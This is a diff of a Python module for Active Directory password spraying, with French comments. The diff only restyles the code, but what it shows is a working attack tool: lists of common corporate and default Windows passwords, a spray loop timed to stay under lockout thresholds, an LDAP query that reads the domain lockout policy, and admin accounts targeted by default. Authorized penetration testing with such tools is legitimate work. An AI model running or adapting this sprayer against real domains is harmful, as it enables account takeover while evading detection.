@@ -1,5 +1,4 @@
-"""
-AD Password Spraying — pulvérisation intelligente de mots de passe.
+"""AD Password Spraying — pulvérisation intelligente de mots de passe.
 
 Effectue une attaque par pulvérisation (spraying) en respectant
 les politiques de verrouillage de compte pour éviter les lockouts.
@@ -24,7 +23,7 @@ Usage:
 import asyncio
 from dataclasses import dataclass, field
 from enum import StrEnum
-from typing import Optional
+
 import structlog
 
 logger = structlog.get_logger(__name__)
@@ -51,48 +50,81 @@ SEASONAL_PASSWORDS = {
 
 # Top 30 mots de passe les plus communs en entreprise
 COMMON_CORPORATE_PASSWORDS = [
-    "Password1", "Password123", "Welcome1", "Welcome123",
-    "Company@123", "Company1", "Corp@2024", "Corp@2025",
-    "P@ssw0rd", "P@ssw0rd123", "Changeme", "ChangeMe123",
-    "Admin123", "Admin@123", "Qwerty123", "Qwerty@123",
-    "Summer2024", "Summer2025", "Summer2026",
-    "Winter2024", "Winter2025", "Winter2026",
-    "Spring2024", "Spring2025", "Spring2026",
-    "Password!", "Password@123", "Letmein123",
-    "Monday123", "Friday123",
+    "Password1",
+    "Password123",
+    "Welcome1",
+    "Welcome123",
+    "Company@123",
+    "Company1",
+    "Corp@2024",
+    "Corp@2025",
+    "P@ssw0rd",
+    "P@ssw0rd123",
+    "Changeme",
+    "ChangeMe123",
+    "Admin123",
+    "Admin@123",
+    "Qwerty123",
+    "Qwerty@123",
+    "Summer2024",
+    "Summer2025",
+    "Summer2026",
+    "Winter2024",
+    "Winter2025",
+    "Winter2026",
+    "Spring2024",
+    "Spring2025",
+    "Spring2026",
+    "Password!",
+    "Password@123",
+    "Letmein123",
+    "Monday123",
+    "Friday123",
 ]
 
 # Top 15 mots de passe par défaut de produits Microsoft/Windows
 DEFAULT_WINDOWS_PASSWORDS = [
-    "Passw0rd", "P@ssw0rd", "Windows10", "Windows11",
-    "Win@2025", "Temp1234", "Temp@1234",
-    "Default123", "NewUser123", "User@123",
-    "Setup123", "Install123", "P@ss1234",
-    "Server2019", "Server2022",
+    "Passw0rd",
+    "P@ssw0rd",
+    "Windows10",
+    "Windows11",
+    "Win@2025",
+    "Temp1234",
+    "Temp@1234",
+    "Default123",
+    "NewUser123",
+    "User@123",
+    "Setup123",
+    "Install123",
+    "P@ss1234",
+    "Server2019",
+    "Server2022",
 ]
 
 
 class SprayMode(StrEnum):
     """Mode de pulvérisation."""
-    SAFE = "safe"           # 1 tentative / 30 min (défaut)
-    NORMAL = "normal"       # 1 tentative / 5 min
+
+    SAFE = "safe"  # 1 tentative / 30 min (défaut)
+    NORMAL = "normal"  # 1 tentative / 5 min
     AGGRESSIVE = "aggressive"  # 1 tentative / 30 sec (risque lockout)
-    CUSTOM = "custom"       # Délai personnalisé
+    CUSTOM = "custom"  # Délai personnalisé
 
 
 @dataclass
 class SprayConfig:
     """Configuration du sprayer."""
+
     mode: SprayMode = SprayMode.SAFE
-    delay_seconds: float = 1800.0    # Délai entre 2 tentatives (SAFE = 30min)
+    delay_seconds: float = 1800.0  # Délai entre 2 tentatives (SAFE = 30min)
     max_attempts_before_rest: int = 3  # Pause après N tentatives
     rest_duration_seconds: float = 600.0  # Durée de la pause (10 min)
-    lockout_threshold: int = 0       # 0 = auto-détecter
+    lockout_threshold: int = 0  # 0 = auto-détecter
     lockout_window_minutes: int = 30  # Fenêtre d'observation lockout
-    avoid_disabled: bool = True      # Ignorer les comptes désactivés
-    avoid_admin: bool = False        # ⚠️ Ignorer les comptes admin (OFF par défaut)
+    avoid_disabled: bool = True  # Ignorer les comptes désactivés
+    avoid_admin: bool = False  # ⚠️ Ignorer les comptes admin (OFF par défaut)
     target_users: list[str] = field(default_factory=list)  # SAMs spécifiques
-    dry_run: bool = False            # Mode simulation
+    dry_run: bool = False  # Mode simulation
 
     @property
     def effective_delay(self) -> float:
@@ -110,10 +142,11 @@ class SprayConfig:
 @dataclass
 class SprayResult:
     """Résultat d'une tentative de pulvérisation."""
+
     username: str
     password: str
     success: bool = False
-    error: Optional[str] = None
+    error: str | None = None
     timestamp: str = ""
     attempt_number: int = 0
 
@@ -121,6 +154,7 @@ class SprayResult:
 @dataclass
 class SpraySession:
     """Session complète de pulvérisation."""
+
     config: SprayConfig
     total_users: int = 0
     total_passwords: int = 0
@@ -141,7 +175,7 @@ class SpraySession:
 
     def summary(self) -> str:
         lines = [
-            f"=== Password Spray Results ===",
+            "=== Password Spray Results ===",
             f"Users tested: {self.total_users}",
             f"Passwords tried: {self.total_passwords}",
             f"Total attempts: {self.total_attempts}",
@@ -161,6 +195,7 @@ class SpraySession:
 
 # ── Password Sprayer ──────────────────────────────────────────
 
+
 class PasswordSprayer:
     """Pulvérisateur de mots de passe intelligent.
 
@@ -174,11 +209,11 @@ class PasswordSprayer:
         print(session.summary())
     """
 
-    def __init__(self, connector=None, config: Optional[SprayConfig] = None):
-        """
-        Args:
-            connector: ADConnector actif
-            config: Configuration de spray
+    def __init__(self, connector=None, config: SprayConfig | None = None) -> None:
+        """Args:
+        connector: ADConnector actif
+        config: Configuration de spray.
+
         """
         self.connector = connector
         self.config = config or SprayConfig()
@@ -198,8 +233,10 @@ class PasswordSprayer:
 
         Args:
             include_seasonal: Inclure les mots de passe saisonniers
+
         """
         import datetime
+
         passwords = list(COMMON_CORPORATE_PASSWORDS)
         passwords.extend(DEFAULT_WINDOWS_PASSWORDS)
 
@@ -221,10 +258,10 @@ class PasswordSprayer:
 
         Returns:
             Nombre de mots de passe chargés
+
         """
-        with open(path, "r", encoding="utf-8", errors="ignore") as f:
-            passwords = [line.strip() for line in f if line.strip()
-                         and not line.startswith("#")]
+        with open(path, encoding="utf-8", errors="ignore") as f:
+            passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
         self._wordlist = list(dict.fromkeys(passwords))
         logger.info("wordlist_file_loaded", path=path, count=len(self._wordlist))
         return len(self._wordlist)
@@ -239,6 +276,7 @@ class PasswordSprayer:
 
         Returns:
             SpraySession avec les résultats
+
         """
         users = domain_map.users
         return await self.spray_user_list(users)
@@ -251,20 +289,24 @@ class PasswordSprayer:
 
         Returns:
             SpraySession avec les résultats
+
         """
         import time
 
         if not users:
-            raise ValueError("Liste d'utilisateurs vide")
+            msg = "Liste d'utilisateurs vide"
+            raise ValueError(msg)
 
         if not self._wordlist:
             self.load_default_wordlist()
 
         if not self._wordlist:
-            raise ValueError("Liste de mots de passe vide")
+            msg = "Liste de mots de passe vide"
+            raise ValueError(msg)
 
         if not self.connector:
-            raise ValueError("PasswordSprayer requires an active ADConnector")
+            msg = "PasswordSprayer requires an active ADConnector"
+            raise ValueError(msg)
 
         # ── Préparer la liste d'utilisateurs ────────────────────
         user_list = self._prepare_user_list(users)
@@ -281,12 +323,14 @@ class PasswordSprayer:
         else:
             self._lockout_threshold = self.config.lockout_threshold
 
-        logger.info("spray_starting",
-                    users=len(user_list),
-                    passwords=len(self._wordlist),
-                    lockout_threshold=self._lockout_threshold,
-                    mode=self.config.mode,
-                    dry_run=self.config.dry_run)
+        logger.info(
+            "spray_starting",
+            users=len(user_list),
+            passwords=len(self._wordlist),
+            lockout_threshold=self._lockout_threshold,
+            mode=self.config.mode,
+            dry_run=self.config.dry_run,
+        )
 
         session = SpraySession(
             config=self.config,
@@ -304,32 +348,28 @@ class PasswordSprayer:
 
                 if self.config.dry_run:
                     # RÈGLE CRITIQUE : ne jamais logger le mot de passe
-                    logger.info("dry_run_attempt",
-                                user=user_info["username"])
+                    logger.info("dry_run_attempt", user=user_info["username"])
                     continue
 
                 try:
                     result = await self._try_login(
-                        user_info["username"], password, attempt_count
+                        user_info["username"],
+                        password,
+                        attempt_count,
                     )
                     if result.success:
                         session.successes.append(result)
-                        logger.info("spray_success",
-                                    user=result.username,
-                                    attempt=attempt_count)
+                        logger.info("spray_success", user=result.username, attempt=attempt_count)
                     else:
                         session.failures += 1
                 except Exception as e:
                     session.errors += 1
-                    logger.error("spray_error",
-                                 user=user_info["username"],
-                                 error=str(e))
+                    logger.exception("spray_error", user=user_info["username"], error=str(e))
 
                 # ── Gestion du délai ───────────────────────────
                 delay = self.config.effective_delay
                 if attempt_count % self.config.max_attempts_before_rest == 0:
-                    logger.info("taking_rest",
-                                duration=self.config.rest_duration_seconds)
+                    logger.info("taking_rest", duration=self.config.rest_duration_seconds)
                     if not self.config.dry_run:
                         await asyncio.sleep(self.config.rest_duration_seconds)
                 elif delay > 0:
@@ -337,23 +377,24 @@ class PasswordSprayer:
                         await asyncio.sleep(delay)
 
                 # ── Vérifier les lockouts ──────────────────────
-                if (self._lockout_counter
-                        >= self._lockout_threshold * 0.8):
+                if self._lockout_counter >= self._lockout_threshold * 0.8:
                     session.lockouts_detected = self._lockout_counter
-                    logger.warning("lockout_risk_high",
-                                   count=self._lockout_counter,
-                                   threshold=self._lockout_threshold)
+                    logger.warning(
+                        "lockout_risk_high",
+                        count=self._lockout_counter,
+                        threshold=self._lockout_threshold,
+                    )
                     # Pause longue pour laisser la fenêtre de lockout expirer
                     if not self.config.dry_run:
-                        pause = (self.config.lockout_window_minutes * 60
-                                 - self.config.rest_duration_seconds)
+                        pause = (
+                            self.config.lockout_window_minutes * 60
+                            - self.config.rest_duration_seconds
+                        )
                         if pause > 0:
                             await asyncio.sleep(pause)
 
         session.duration_seconds = time.monotonic() - t_start
-        logger.info("spray_complete",
-                    successes=len(session.successes),
-                    failures=session.failures)
+        logger.info("spray_complete", successes=len(session.successes), failures=session.failures)
 
         return session
 
@@ -368,6 +409,7 @@ class PasswordSprayer:
 
         Returns:
             SpraySession
+
         """
         return await self.spray_user_list([{"username": username}])
 
@@ -398,20 +440,24 @@ class PasswordSprayer:
                 continue
             if self.config.avoid_admin and is_admin:
                 continue
-            if (self.config.target_users
-                    and username not in self.config.target_users):
+            if self.config.target_users and username not in self.config.target_users:
                 continue
 
-            user_list.append({
-                "username": username,
-                "enabled": enabled,
-                "is_admin": is_admin,
-            })
+            user_list.append(
+                {
+                    "username": username,
+                    "enabled": enabled,
+                    "is_admin": is_admin,
+                },
+            )
 
         return user_list
 
     async def _try_login(
-        self, username: str, password: str, attempt: int
+        self,
+        username: str,
+        password: str,
+        attempt: int,
     ) -> SprayResult:
         """Teste un couple username/password."""
         from datetime import datetime
@@ -427,7 +473,8 @@ class PasswordSprayer:
 
         try:
             success = await self.connector.test_credentials(
-                username, password
+                username,
+                password,
             )
             if not success:
                 self._lockout_counter += 1
@@ -459,6 +506,7 @@ class PasswordSprayer:
 
         Returns:
             Seuil détecté (défaut: 5 si non détecté)
+
         """
         if not self.connector or not self.connector.is_connected:
             return 5  # Valeur par défaut raisonnable
@@ -468,16 +516,14 @@ class PasswordSprayer:
             entries = await self.connector.search(
                 "(objectClass=domainDNS)",
                 scope="base",
-                attributes=["lockoutThreshold", "lockoutDuration",
-                            "lockoutObservationWindow"],
+                attributes=["lockoutThreshold", "lockoutDuration", "lockoutObservationWindow"],
             )
 
             if entries:
                 attrs = entries[0].get("attributes", {})
                 threshold = int(attrs.get("lockoutThreshold", [0])[0] or 0)
                 if threshold > 0:
-                    logger.info("lockout_threshold_detected",
-                                threshold=threshold)
+                    logger.info("lockout_threshold_detected", threshold=threshold)
                     return threshold
         except Exception as e:
             logger.warning("lockout_detection_failed", error=str(e))
@@ -489,9 +535,11 @@ class PasswordSprayer:
 
 # ── Fonctions utilitaires ─────────────────────────────────────
 
+
 def get_seasonal_wordlist() -> list[str]:
     """Retourne la wordlist saisonnière pour le mois courant."""
     import datetime
+
     month = datetime.datetime.now().month
     return SEASONAL_PASSWORDS.get(month, [])
 
@@ -499,6 +547,7 @@ def get_seasonal_wordlist() -> list[str]:
 def get_full_default_wordlist() -> list[str]:
     """Retourne la wordlist complète par défaut (dédupliquée)."""
     import datetime
+
     passwords = list(COMMON_CORPORATE_PASSWORDS)
     passwords.extend(DEFAULT_WINDOWS_PASSWORDS)
     month = datetime.datetime.now().month
